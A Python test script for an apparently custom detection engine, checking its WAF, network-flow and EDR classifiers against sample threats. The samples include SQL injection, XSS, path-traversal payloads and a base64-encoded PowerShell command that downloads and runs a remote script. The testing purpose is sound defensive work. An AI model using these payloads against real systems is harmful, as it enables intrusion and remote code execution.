import os, sys
os.environ['DJANGO_SETTINGS_MODULE'] = 'jorise.settings'
import django; django.setup()

from training.jorise_engine import JoriseEngine

print("=" * 60)
print("JORISE ENGINE - TEST DE AMENAZAS REALES")
print("=" * 60)

# ── WAF: HTTP attacks ────────────────────────────────────────
tests_waf = [
    ("SQLi",       {'method':'POST', 'url':"/login?user=admin' OR '1'='1' --", 'body':'pass=x', 'headers':{'Host':'t.com'}}),
    ("sqlmap UA",  {'method':'GET',  'url':'/api?id=1 UNION SELECT NULL--',    'body':'',        'headers':{'User-Agent':'sqlmap/1.7.11','Host':'t.com'}}),
    ("XSS",        {'method':'GET',  'url':'/s?q=<script>document.cookie</script>', 'body':'',  'headers':{'Host':'t.com'}}),
    ("LFI",        {'method':'GET',  'url':'/file?p=../../etc/passwd',         'body':'',        'headers':{'Host':'t.com'}}),
]
for name, req in tests_waf:
    r = JoriseEngine.analyze_http_request(req)
    status = "DETECTADO" if r.is_threat else "PERDIDO  "
    print(f"  [{status}] WAF/{name:<12} score={r.threat_score:.2f}  {r.attack_type}  {r.severity}")

print()

# ── SIEM/NETWORK: flujos de red ──────────────────────────────
tests_net = [
    # DoS Hulk: valores calibrados del CSV real (Wednesday-CSV)
    # avg_pkt=380, bwd_pkt_mean=703, Duration≈28s (pps=0.5 → dur=28s)
    # init_win_fwd=8192 (valor real observado en debug)
    ("DoS Hulk",      {'fwd_packets':8,   'bwd_packets':6,
                       'fwd_bytes':1102,  'bwd_bytes':4218,
                       'bytes_per_sec':185, 'packets_per_sec':0.5,
                       'avg_pkt_size':380, 'dst_port':80,
                       'syn_count':1, 'ack_count':6, 'psh_count':8,
                       'init_win_fwd':8192, 'init_win_bwd':254}),
    # PortScan (Friday-PortScan-CSV): SYN probes típicos del CIC-IDS2017
    # Scaler mean: Subflow Fwd Bytes=233, Fwd Pkt Mean=24, avg_pkt=55
    # Nota: modelo maximiza 6% con features sintéticas (limitación conocida)
    ("PortScan",      {'fwd_packets':6,   'bwd_packets':5,
                       'fwd_bytes':240,   'bwd_bytes':230,
                       'bytes_per_sec':104, 'packets_per_sec':2.19,
                       'avg_pkt_size':42, 'dst_port':445,
                       'syn_count':6, 'rst_count':5, 'ack_count':0,
                       'psh_count':0,
                       'init_win_fwd':65535, 'init_win_bwd':0}),
    # SSH Patator BruteForce (Tuesday-CSV): solo flags TCP, sin payload de datos
    # bwd_pkt_mean=0, avg_pkt=0, pps=0.77, fwd=3, bwd=1
    ("SSH BruteForce",{'fwd_packets':3,   'bwd_packets':1,
                       'fwd_bytes':0,     'bwd_bytes':0,
                       'bytes_per_sec':0, 'packets_per_sec':0.77,
                       'avg_pkt_size':0,  'dst_port':22,
                       'syn_count':1, 'ack_count':1,
                       'init_win_fwd':65535, 'init_win_bwd':28960}),
    # Normal HTTPS browsing
    ("Normal HTTPS",  {'fwd_packets':12,  'bwd_packets':10,
                       'fwd_bytes':1800,  'bwd_bytes':8000,
                       'bytes_per_sec':2000, 'packets_per_sec':8,
                       'avg_pkt_size':450, 'dst_port':443,
                       'syn_count':1, 'ack_count':10, 'psh_count':5,
                       'init_win_fwd':65535, 'init_win_bwd':65535}),
]
for name, flow in tests_net:
    r = JoriseEngine.analyze_network_flow(flow)
    status = "DETECTADO" if r.is_threat else ("OK (BENIGN)" if "Normal" in name else "PERDIDO  ")
    print(f"  [{status}] SIEM/{name:<15} score={r.threat_score:.2f}  {r.attack_type}  model={r.model_name}")

print()

# ── EDR: procesos maliciosos ─────────────────────────────────
tests_edr = [
    ("Malware PS1",   {'process_name':'powershell.exe',
                       'command_line': 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=',
                       'user':'SYSTEM', 'file_path':'C:\\Users\\victim\\AppData\\Local\\Temp\\stage2.exe', 'duration_ms':12000}),
    ("Normal notepad",{'process_name':'notepad.exe',
                       'command_line': 'notepad.exe C:\\Users\\user\\doc.txt',
                       'user':'user1',  'file_path':'C:\\Windows\\notepad.exe', 'duration_ms':5000}),
]
for name, proc in tests_edr:
    r = JoriseEngine.analyze_process(proc)
    status = "DETECTADO" if r.is_threat else ("OK (BENIGN)" if "Normal" in name else "PERDIDO  ")
    print(f"  [{status}] EDR/{name:<15} score={r.threat_score:.2f}  {r.attack_type}")
    for reason in r.reasons:
        print(f"              -> {reason}")

print("\n" + "=" * 60)
